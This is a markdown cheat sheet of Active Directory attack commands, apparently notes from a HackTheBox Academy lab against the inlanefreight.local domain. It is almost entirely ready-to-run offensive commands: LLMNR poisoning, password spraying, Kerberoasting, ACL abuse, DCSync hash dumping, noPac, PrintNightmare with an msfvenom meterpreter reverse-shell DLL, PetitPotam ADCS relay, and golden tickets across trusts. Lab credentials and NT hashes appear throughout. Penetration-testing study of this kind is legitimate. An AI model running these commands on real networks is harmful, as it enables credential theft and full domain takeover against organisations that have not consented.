# Active Directory

### Recon

```shell
  viewdns.info
  nslookup ns1.inlanefreight.com
  linkedin2username
  filetype:pdf inurl:inlanefreight.com
  intext:"@inlanefreight.com" inurl:inlanefreight.com
  sudo python3 dehashed.py -q inlanefreight.local -p
```

---

### Initial Enumeration

```shell
  sudo -E wireshark
  sudo tcpdump -i ens224
  sudo responder -I ens224 -A
  fping -asgq 172.16.5.0/23
  sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
  nmap -A 172.16.5.100
  sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
  
  sudo git clone https://github.com/ropnop/kerbrute.git
  sudo make all

  echo <hash> | tr -d "[:space:]" > hash

  use auxiliary/scanner/portscan/tcp
  set rhosts 172.16.6.0/24
  set PORTS 139,445
  set threads 50
  run

```

```shell
  #kerbrute
  
  ./kerbrute_linux_amd64
  cho $PATH
  /home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
  sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
  kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

---

### LLMNR/NBT-NS Poisoning

```shell
  # From linux capture the ntlmv2 hash
  responder -h
  sudo responder -I ens224 
  hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt

  # From windows capture the ntlmv2 hash
  Import-Module .\Inveigh.ps1
  (Get-Command Invoke-Inveigh).Parameters

  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
  .\Inveigh.exe

  $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
  Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

---

### Sighting In, Hunting For a User

```shell
  # From Linux
  crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

  rpcclient -U "" -N 172.16.5.5
  querydominfo

  enum4linux -P 172.16.5.5
  enum4linux-ng -P 172.16.5.5 -oA ilfreight
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

  # From windows
  net use \\DC01\ipc$ "" /u:""
  net use \\DC01\ipc$ "" /u:guest
  #1331 error = account disabled, 1326 username or password is incorrect, 1909 Account is llocked out via password policy
  net accounts

  import-module .\PowerView.ps1
  Get-DomainPolicy
```

---

### Username Enumeration

```shell
  enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
  rpcclient -U "" -N 172.16.5.5
  crackmapexec smb 172.16.5.5 --users
  ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
  ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

  # only  username not full email
  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | awk '/VALID USERNAME/ {print $7}' | cut -d '@' -f 1 > valid_users.txt
  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | awk '/VALID USERNAME/ {print $7}' > valid_users.txt
  sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
  
```

### Password Spraying 

```shell
  # Linux
  for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
  kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
  sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
  sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

  sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

  # Windows
  Import-Module .\DomainPasswordSpray.ps1
  Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```
---

### Deeper Down / Living Off the Land

```shell
  Get-MpComputerStatus
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  $ExecutionContext.SessionState.LanguageMode
  Find-LAPSDelegatedGroups
  Find-AdmPwdExtendedRights
  Get-LAPSComputers

  Get-Module
  Get-ChildItem Env: | ft key,value
  Get-host
  powershell.exe -version 2
  netsh advfirewall show allprofiles
  sc query windefend
  Get-MpComputerStatus
  qwinsta # Am i the only one logged in?
  arp -a
  route print
  wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

  net group /domain
  net user /domain wrouse
  net localgroup Administrators

  dsquery user
  dsquery computer
  dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
  dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
  dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName description
  dsquery * -filter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1)(description=*))" -limit 5 -attr SAMAccountName description
```

---

### Credentialed Enumeration 

Linux

```shell
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
  sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
  sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
  head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

  smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
  smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
  rpcclient -U "" -N 172.16.5.5
  #When connected via rpcclient
  queryuser 0x457
  enumdomusers

  psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
  wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

  sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

Windows

```shell
  Get-Module
  Import-Module ActiveDirectory
  Get-Module
  Get-ADDomain
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

  Get-ADTrust -Filter *
  Get-ADGroup -Filter * | select name
  Get-ADGroup -Identity "Backup Operators"
  Get-ADGroupMember -Identity "Backup Operators"
  Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
  Get-DomainTrustMapping
  Test-AdminAccess -ComputerName ACADEMY-EA-MS01
  Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
  Get-DomainUser * -SPN | select samaccountname

  .\SharpView.exe Get-DomainUser -Help
  .\SharpView.exe Get-DomainUser -Identity forend
  Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v -data
  Snaffler.exe -s -d inlanefreight.local -v -data

  .\SharpHound.exe -c All --zipfilename ILFREIGHT
  cd .\BloodHound-GUI\
  .\BloodHound.exe
```

---

### Kerberoasting

Linux

```shell
  wget -q https://github.com/fortra/impacket
  pip install impacket

  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
  GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force
  sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

Windows

```shell
  setspn.exe -Q */*
  setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
  setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

  #Mimikatz
  base64 /out:true
  kerberos::list /export

  echo "<base64 blob>" |  tr -d \\n
  cat encoded_file | base64 -d > sqldev.kirbi
  python2.7 kirbi2john.py sqldev.kirbi
  sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
  cat sqldev_tgs_hashcat
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force

  Import-Module .\PowerView.ps1
  Get-DomainUser * -spn | select samaccountname
  Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
  cat .\ilfreight_tgs.csv

  .\Rubeus.exe
  .\Rubeus.exe kerberoast /stats
  .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
  .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
  Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
  hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force
```

---

### Access Control (ACL)

```shhell
  Find-InterestingDomainAcl
  Import-Module .\PowerView.ps1
  $sid = Convert-NameToSid wley
  Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

  $guid= "00299570-246d-11d0-a768-00aa006e0529"
  Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
  Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
  foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

  $sid2 = Convert-NameToSid damundsen
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
  Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

  $itgroupsid = Convert-NameToSid "Information Technology"
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

  $adunnsid = Convert-NameToSid adunn 
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

```shell
  $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
  $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

  Import-Module .\PowerView.ps1
  Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

  $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
  $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 

  Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

  Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
  Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

  Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

  .\Rubeus.exe kerberoast /user:adunn /nowrap
  Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
  Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
  Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
  
  ConvertFrom-SddlString "<sddL_String>" 
```

---

### DSYNC

```shell
  Import-Module .\PowerView.ps1
  Get-DomainUser -Identity syncron  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

  runas /netonly /user:INLANEFREIGHT\adunn powershell

  $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
  Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

  secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
  ls inlanefreight_hashes*

  Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

  cat inlanefreight_hashes.ntds.cleartext
  .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
  
```

---

### Privileged Access

```shell
  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
  Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

  $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
  $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
  Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

  evil-winrm -i 10.129.201.234 -u forend

  cd .\PowerUpSQL\
  Import-Module .\PowerUpSQL.ps1
  Get-SQLInstanceDomain
  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

  mssqlclient.py
  mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
  enable_xp_cmdshell
  xp_cmdshell whoami /priv
  output

  #BloodHound
  MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
  MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

---

### Bleeding Edge

```shell
  git clone https://github.com/SecureAuthCorp/impacket.git
  sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
  sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

  sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

  git clone https://github.com/cube0x0/CVE-2021-1675.git
  pip3 uninstall impacket
  git clone https://github.com/cube0x0/impacket
  cd impacket
  python3 ./setup.py install

  rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
  sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
  sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

  sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

  python3 PetitPotam.py 172.16.5.225 172.16.5.5

  sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

  python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
  export KRB5CCNAME=dc01.ccache
  secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
  klist
  crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
  python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
  secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

  .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
  mimikatz.exe lsadump::dcsync /user:inlanefreight\krbtg
```

### Miscalllenous Misconfigurations

```shell
  Import-Module .\SecurityAssessment.ps1
  Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

  Import-Module .\PowerView.ps1
  Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

  adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
  head records.csv
  adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
  Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
  Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
  Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
  ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
  cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

  gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
  crackmapexec smb -L | grep gpp
  crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

ASRepRoasting

```shell
  Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
  .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
  hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
  GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users

  Get-DomainGPO |select displayname
  Get-GPO -All | Select DisplayName
  $sid=Convert-NameToSid "Domain Users"
  Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
  Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

---

### Trusts

```shell
  Import-Module activedirectory
  Get-ADTrust -Filter *
  Get-DomainTrust
  Get-DomainTrustMapping
  Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

  netdom query /domain:inlanefreight.local trust
  netdom query /domain:inlanefreight.local dc
  netdom query /domain:inlanefreight.local workstation
```

Windows

``` shell
  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
  Get-DomainSID
  Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
  ls \\academy-ea-dc01.inlanefreight.local\c$

  .\Rubeus.exe kerberoast /domain:freightlogistics.local /user:mssqlsvc /nowrap
  hashcata -m 13100 -w 3 -O hash <wordlist>

  mimikatz.exe kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
  klist
  ls \\academy-ea-dc01.inlanefreight.local\c$
  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
  mimikatz.exe lsadump::dcsync /user:INLANEFREIGHT\lab_adm
  mimikatz.exe lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

Linux

```shell
  lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
  lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
  lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
  ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
  export KRB5CCNAME=hacker.ccache
  psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
  raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

  secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
  secretsdump.py inlanefreight.local/administrator@172.16.5.5 -hashes aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf -just-dc | grep bross
  
```

---

### Attacking Domain Trust

```shell
  Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
  Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
  Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

  #Linux
  GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
  GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/wley
  GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
  $smbexec.py freightlogistics/sapsso@freightlogistics.local

  cat /etc/resolv.conf
  bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
  zip -r ilfreight_bh.zip *.json
  bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
  
  
```

